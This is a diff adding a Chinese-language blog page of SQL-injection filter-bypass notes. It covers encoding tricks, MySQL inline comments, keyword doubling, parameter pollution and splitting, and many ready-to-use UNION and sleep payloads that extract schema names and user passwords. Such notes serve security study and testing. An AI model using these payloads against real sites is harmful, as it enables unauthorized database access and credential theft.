@@ -1,0 +1,501 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>sql注入bypass | Yaoa</title>
+  <meta name="author" content="yaoa">
+  
+  <meta name="description" content="编码绕过
+大小写
+
+url编码
+
+html编码
+
+16进制 0x7573657273为users的16进制
+   可以对单个字符进行16进制编码，也可对整个字符进行16进制编码
+
+unicode编码 
+    单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
+
+     空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
+
+     左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
+
+   右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
+
+使用两种不同编码的字符进行比较，结果可能为 True 也可能为 False
+
+
+注释
+// – – + – - # /**/ ;%00
+内联注释 /**/ 可以绕过空格过滤
+/*!UNION*/在mysql可以执行
+index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3关键字替换为空格时
+
+union =&amp;gt; ununionion
+相同功能替换
+函数替换
+substring / mid / sub
+ascii / hex / bin
+benchmark / sleep
+
+
+变量替换
+user() / @@user
+
+
+符号和关键字
+and / &amp;amp;
+or / |
+
+
+
+HTTP参数http参数污染id=1&amp;amp;id=2&amp;amp;id=3 根据容器不同会有不同的结果"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="sql注入bypass"/>
+  <meta property="og:site_name" content="Yaoa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Yaoa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>归档
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>分类
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>标签
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>关于我
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> sql注入bypass</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ul>
+<li><p>大小写</p>
+</li>
+<li><p>url编码</p>
+</li>
+<li><p>html编码</p>
+</li>
+<li><p>16进制 0x7573657273为users的16进制</p>
+<pre><code>   可以对单个字符进行16进制编码，也可对整个字符进行16进制编码</code></pre>
+</li>
+<li><p>unicode编码 </p>
+<pre><code>    单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
+
+     空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
+
+     左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
+
+   右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></pre>
+</li>
+<li><p>使用两种不同编码的字符进行比较，结果可能为 True 也可能为 False</p>
+</li>
+</ul>
+<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul>
+<li>// – – + – - # /**/ ;%00</li>
+<li>内联注释 /**/ 可以绕过空格过滤</li>
+<li><code>/*!UNION*/</code>在mysql可以执行</li>
+<li><code>index.php?id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3</code><h2 id="关键字替换为空格时"><a href="#关键字替换为空格时" class="headerlink" title="关键字替换为空格时"></a>关键字替换为空格时</h2></li>
+</ul>
+<p>union =&gt; ununionion</p>
+<h2 id="相同功能替换"><a href="#相同功能替换" class="headerlink" title="相同功能替换"></a>相同功能替换</h2><ul>
+<li>函数替换<ul>
+<li>substring / mid / sub</li>
+<li>ascii / hex / bin</li>
+<li>benchmark / sleep</li>
+</ul>
+</li>
+<li>变量替换<ul>
+<li>user() / @@user</li>
+</ul>
+</li>
+<li>符号和关键字<ul>
+<li>and / &amp;</li>
+<li>or / |</li>
+</ul>
+</li>
+</ul>
+<h2 id="HTTP参数"><a href="#HTTP参数" class="headerlink" title="HTTP参数"></a>HTTP参数</h2><h3 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h3><p>id=1&amp;id=2&amp;id=3 根据容器不同会有不同的结果</p>
+<h3 id="http分割注入"><a href="#http分割注入" class="headerlink" title="http分割注入"></a>http分割注入</h3><h2 id="常用字符替代"><a href="#常用字符替代" class="headerlink" title="常用字符替代"></a>常用字符替代</h2><ul>
+<li><p><code>and -&gt; &amp;&amp;</code></p>
+</li>
+<li><p><code>or -&gt; || </code></p>
+</li>
+<li><p><code>空格-&gt; /**/ -&gt; %a0 -&gt; %0a -&gt; + </code></p>
+</li>
+<li><p><code># -&gt; --+ -&gt; ;%00(php&lt;=5.3.4) -&gt; or &#39;1&#39;=&#39;1 </code></p>
+</li>
+<li><p><code>= -&gt; like -&gt; regexp -&gt; &lt;&gt; -&gt; in</code></p>
+</li>
+<li><p><code>= -&gt; &lt;&gt;</code></p>
+</li>
+<li><p>特殊符号绕过</p>
+<ul>
+<li><p>科学记数法<br>id=0e1union select user 1e1from mysql.user</p>
+</li>
+<li><p><code>+</code></p>
+<pre><code>   id=0e1union(select+1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p><code>-</code></p>
+<pre><code>id=0e1union(select-1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>`反引号`</p>
+<pre><code>id=0e1union(select 1,(select `schema_name` from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>~</p>
+<pre><code>id=0e1union(select~1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>!</p>
+<pre><code>id=0e1union(select!1,(select schema_name from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>@<code>content</code></p>
+<pre><code>id=0e1union(select@`id`,(select schema_name from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>.1</p>
+<p> id=.1union/<em>.1</em>/select password from users</p>
+</li>
+<li><p>单引号、双引号</p>
+<pre><code>id=.1union/*.1*/select&#39;1&#39;,password from users
+id=.1union/*.1*/select&quot;1&quot;,password from users</code></pre>
+</li>
+<li><p>括号</p>
+<pre><code>id=0e1union(select!1,(select(schema_name)from information_schema.schemata limit 1))</code></pre>
+</li>
+<li><p>花括号</p>
+<pre><code>id=1 union(select%0aall&#123;x users&#125;from&#123;x ddd&#125;)
+id=1 union(select%0adistinct&#123;x users&#125;from&#123;x ddd&#125;)
+id=1 union(select%0adistinctrow&#123;x users&#125;from&#123;x ddd&#125;)</code></pre>
+</li>
+<li><p>%</p>
+<pre><code>   id=1 union sel%ect password f%r%o%m users</code></pre>
+</li>
+<li><p>%23%0a</p>
+<pre><code>id=1 union%23%0aselect user from users</code></pre>
+</li>
+<li><p>%23%0d%0a %2d%2d%0a（%0d 0a 换行）</p>
+<pre><code>id=1 union%23%0d%0aselect username from users%23
+id=1 union%2d%2d%0aselect username from users%23
+id=1 union%2d%2d%0d%0aselect username from users%23</code></pre>
+</li>
+<li><p>emoji 图标</p>
+<pre><code>%23emoji图标%0a</code></pre>
+</li>
+<li><p>%0a 放在 select 和 all 之间</p>
+<pre><code>id=1 union/*!50000select%0aall*/username from users%23
+id=1 union/*!50000select%0adistinct*/username from users%23
+id=1 union/*!50000select%0adistinctrow*/username from users%23</code></pre>
+</li>
+</ul>
+</li>
+<li><p>HPP</p>
+<ul>
+<li><p>/?id=1/*<em>/union/</em>&amp;id=<em>/select/</em>&amp;id=<em>/pwd/</em>&amp;id=<em>/from/</em>&amp;id=*/users</p>
+<pre><code>重复出现同一个参数，容器不同，结果不同。</code></pre>
+</li>
+</ul>
+</li>
+<li><p>HTTP 参数分割，不同的参数之间进行语句分割结果到了数据库执行查询时再合并语句</p>
+<p> <code>/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--</code></p>
+</li>
+<li><p>逗号过滤</p>
+<ul>
+<li><p>-1 union select 1,2,3</p>
+</li>
+<li><p>-1 union select * from (select 1)a join (select 2)b join (select 3)c%23</p>
+</li>
+<li><p>limit中：</p>
+<ul>
+<li>limit 2,1</li>
+<li>limit 1 offset 2</li>
+</ul>
+</li>
+<li><p>substr中</p>
+<ul>
+<li>substr(database(),5,1)</li>
+<li>substr(database() from 5 for 1) from为从第几个字符开始，for为截取几个</li>
+</ul>
+</li>
+<li><p>Sleep()中</p>
+<ul>
+<li>if(database()=’xxx’,sleep(3),1)</li>
+<li>id=1 and databse()=’xxx’ and sleep(3)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>and or || &amp;&amp; 被过滤</p>
+<ul>
+<li>! ^ ~以及not xor来代替：</li>
+</ul>
+</li>
+<li><p>利用别名注入</p>
+<ul>
+<li>union select 1,(select b.2 from (select 1,2,3,4 union select * from table1)b limit 1,1),3</li>
+<li>select * from table1 where ‘1’=’’ or if(ascii(substr((select b.2 from (select 1,2,3,4 union select * from table1)b limit 3,1),1,1))&gt;1,sleep(3),0)</li>
+</ul>
+</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/12/23/sql%E6%B3%A8%E5%85%A5bypass/" class="leancloud-visitors view" data-flag-title="sql注入bypass">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/12/23/sql注入手法/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a type="button" class="btn btn-default disabled">下一页<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">留言</h2>
+
+    
+    <div class="ds-thread" data-thread-key="2020/12/23/sql注入bypass/" data-title="sql注入bypass"
+         data-url="http://yaoa.cool/2020/12/23/sql%E6%B3%A8%E5%85%A5bypass/"></div>
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-12-23 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Diary/">Diary<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/PS3/">PS3<span>1</span></a></li> <li><a href="/tags/Games/">Games<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+<script type="text/javascript">
+  var duoshuoQuery = { short_name: '123' };
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';
+    ds.async = true;
+    ds.src = 'http://static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script>
+
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2020 yaoa's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
